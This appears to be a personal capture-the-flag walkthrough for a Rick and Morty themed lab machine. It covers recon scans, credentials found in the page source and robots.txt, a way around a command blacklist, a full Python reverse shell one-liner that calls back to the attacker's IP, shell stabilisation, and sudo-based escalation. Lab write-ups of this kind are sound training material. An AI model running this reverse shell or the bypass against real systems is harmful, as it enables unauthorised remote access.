target machine IP address:  10.10.126.11 
kali IP address: 10.10.159.125

# Recon 
`nmap -sV(service) -sC(script) -oN(output) file  10.10.126.11` 
	![](Pasted%20image%2020241112190313.png)
`nikto -h http://10.10.126.11 | tee nikto.log (output)`
	![](Pasted%20image%2020241112190816.png)
`gobuster dir -u http://10.10.126.11 -w /root/Desktop/wordlists/dirb/big.txt -x php,sh,txt,cgi,html,js,css,py | tee gobuster.log(output)`
	![](Pasted%20image%2020241112191526.png)

# Task 1
- page source revereals username: R1ckRul3s
	![](Pasted%20image%2020241112191833.png)

- `robots.txt` reveals: Wubbalubbadubdub
	![](Pasted%20image%2020241112192130.png)

- `login.php` reveals: here we will login with the above discovered info
	![](Pasted%20image%2020241112192340.png)![](Pasted%20image%2020241112192507.png)

- `cat` command is not allowed so we can make use of ``grep` command
	![](Pasted%20image%2020241112194408.png)
	
- using `grep -R .` to display info of all files contained in the dir
	![](Pasted%20image%2020241112194627.png)
	![](Pasted%20image%2020241112194913.png)
- we notice that a lot of commands are blacklisted 
	![](Pasted%20image%2020241113145954.png)
- we can use a reverse shell (pentestmonkey Pyhton rev.shell)
  ![](Pasted%20image%2020241113150553.png)![](Pasted%20image%2020241113150433.png)
  modifying command:
  ```
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.159.125",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```
  ![](Pasted%20image%2020241113152445.png)
  - *we will stabilize the shell using below technique:*
	```
	# Step 1: Spawn a TTY shell
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	
	# Step 2: Set environment variables
	export TERM=xterm
		
	# Step 3: Background the shell
	Ctrl + Z
	
	# Step 4: Configure local terminal settings
	stty raw -echo; fg
	```
![](Pasted%20image%2020241113155919.png)

- check directories permissions `ls -ld` 
- cd where we have write priv(`/tmp`) and transfer linepeas via python3 -m http.server {port} and run it 
- checking other users in home directory (rick dir) -> flag2
- checking root permissions --> `sudo -l` ( we see that we have root permissions) -> flag3
